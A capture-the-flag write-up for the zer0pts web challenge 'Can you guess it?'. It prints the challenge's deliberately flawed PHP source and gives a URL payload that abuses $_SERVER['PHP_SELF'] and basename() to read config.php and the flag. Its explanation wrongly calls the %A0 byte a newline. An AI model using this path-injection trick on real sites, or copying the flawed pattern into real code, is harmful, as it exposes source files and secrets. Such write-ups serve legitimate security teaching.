# zer0pts : Can you guess it? 

**Solver:** davx

**Category:** web

**Points:** 338

**Description:** [Challenge](http://18.179.178.246:8003/)

## Writeup

If you enter the Challenge site you see a input form where you can enter your guess and a link to the source of the page. 
The source of the page looks like this:
```PHP
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
[HTML STUFF]
```
You can see that the "guess" section is impossible to guess right. That means we have to extract the flag in another way than guessing the right number. The first idea that comes up is an ```$_SERVER['PHP_SELF']``` injection. 

A payload for this would look like
```
http://18.179.178.246:8003/index.php/config.php?source
```
This would cause that ```$_SERVER['PHP_SELF'] = /index.php/config.php``` and if we apply ```basename()``` on it we get the output ```basename($_SERVER['PHP_SELF']) = config.php```. Unfortunately the code checks if the ```$_SERVER['PHP_SELF']``` ends with ```config.php```, 
but the ```preg_match()``` only returns true if there is no char or content after the ```config.php``` part. 

Furthermore the ```basename()``` function will ignore a new line character which would cause a false in the ```preg_match()``` function.

So this is the final payload:
```
http://18.179.178.246:8003/index.php/config.php/%A0?source
```

And we get the content of the config file
```
<?php
define('FLAG', 'zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}');
```